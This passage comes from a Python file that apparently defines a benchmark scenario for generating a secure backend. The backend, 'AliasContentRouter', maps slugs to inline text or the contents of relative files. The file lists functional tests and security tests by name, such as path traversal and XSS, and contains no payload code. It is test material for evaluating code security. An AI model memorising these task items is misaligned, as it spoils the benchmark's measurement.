          description: Alias not found or source file missing
        '400':
          description: Invalid request
        '422':
          description: Unprocessable request
components:
  schemas:
    InlineAliasData:
      type: object
      required:
        - mode
        - text
      properties:
        mode:
          type: string
          enum: [inline]
        text:
          type: string
          description: Inline text to serve
          example: "Hello, world!"
    FileAliasData:
      type: object
      required:
        - mode
        - path
      properties:
        mode:
          type: string
          enum: [file]
        path:
          type: string
          description: Relative file path whose contents will be served
          example: "content/readme.txt"
    AliasCreateRequest:
      oneOf:
        - allOf:
            - $ref: '#/components/schemas/InlineAliasData'
            - type: object
              required: [slug]
              properties:
                slug:
                  type: string
                  description: Unique slug identifier
                  example: "hello"
        - allOf:
            - $ref: '#/components/schemas/FileAliasData'
            - type: object
              required: [slug]
              properties:
                slug:
                  type: string
                  description: Unique slug identifier
                  example: "docs/readme"
      discriminator:
        propertyName: mode
    AliasUpdateRequest:
      oneOf:
        - $ref: '#/components/schemas/InlineAliasData'
        - $ref: '#/components/schemas/FileAliasData'
      discriminator:
        propertyName: mode
"""

_TEXT_SPEC = """
AliasContentRouter manages human-readable slugs that map to content served verbatim. It supports creating aliases, updating their mode/content, and resolving slugs to retrieve the stored content.

Create alias (POST /aliases):
- Accepts a JSON body describing the alias to create. Two variants are supported, distinguished by the mode field:
  - Inline mode: { mode: "inline", text: string, slug: string }
  - File mode: { mode: "file", path: string, slug: string }
- The slug is a unique string identifier for the alias.
- On success, responds 201 with JSON { slug: string, ownerToken: string } for future updates.
- Errors: 409 if the slug already exists; 400 for invalid requests; 422 for unprocessable requests.

Update alias (PUT /aliases/{slug}):
- Path parameter slug identifies the alias to update.
- Requires the X-Owner-Token header containing the owner token returned at creation.
- Accepts a JSON body to set the alias’s mode and content, using one of:
  - Inline mode: { mode: "inline", text: string }
  - File mode: { mode: "file", path: string }
- On success, responds 200.
- Errors: 403 for missing/invalid owner token; 404 if the alias does not exist; 400 for invalid requests; 422 for unprocessable requests.

Resolve content (GET /aliases/{slug}/content):
- Path parameter slug identifies the alias to resolve.
- Returns the stored content verbatim as application/octet-stream (binary) with status 200. For inline aliases, this is the exact text; for file aliases, this is the exact bytes of the referenced relative file.
- Errors: 404 if the alias is not found or the source file is missing; 400 for invalid requests; 422 for unprocessable requests.

Schema notes:
- mode is the discriminator and must be either "inline" or "file".
- InlineAliasData requires mode and text.
- FileAliasData requires mode and path.
- AliasCreateRequest additionally requires slug.
"""

from scenarios.base import Scenario

SCENARIO = Scenario(
    id="""AliasContentRouter""",
    api_spec=_API_SPEC,
    text_spec=_TEXT_SPEC,
    short_app_description="""A backend that manages readable slugs mapping to content. Clients can create an alias with a unique slug that serves either inline text or the contents of a relative file path; the API returns an owner token for future modifications. Clients can update an alias’s mode and content using its owner token. Clients can resolve a slug to retrieve the stored content verbatim.""",
    needs_db=True,
    needs_secret=False,
    scenario_instructions="""""",
    functional_tests=[
        func_test_create_inline_alias_and_resolve_content,
        func_test_create_two_inline_aliases_and_resolve_each,
        func_test_update_inline_alias_and_verify_new_content,
    ],
    security_tests=[
        sec_test_path_traversal,
        sec_test_xss,
        sec_test_improper_input_validation,
        sec_test_improper_access_control,
        sec_test_insufficiently_protected_credentials,
    ],
)
